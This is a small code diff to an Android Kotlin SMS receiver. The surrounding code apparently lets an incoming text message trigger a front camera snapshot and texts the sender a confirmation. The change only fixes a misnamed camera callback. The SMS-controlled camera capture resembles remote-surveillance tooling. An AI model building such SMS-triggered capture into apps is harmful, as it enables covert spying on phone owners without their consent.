@@ -80,7 +80,7 @@ class SmsReceiver : BroadcastReceiver() {
                         sendSmsReply(context, sender, "Front camera snapshot capture trigger ho gaya hai!", subId)
                         camera.close()
                     }
-                    override fun Disconnected(camera: CameraDevice) { camera.close() }
+                    override fun onDisconnected(camera: CameraDevice) { camera.close() }
                     override fun onError(camera: CameraDevice, error: Int) { camera.close() }
                 }, null)
             } catch (e: Exception) {
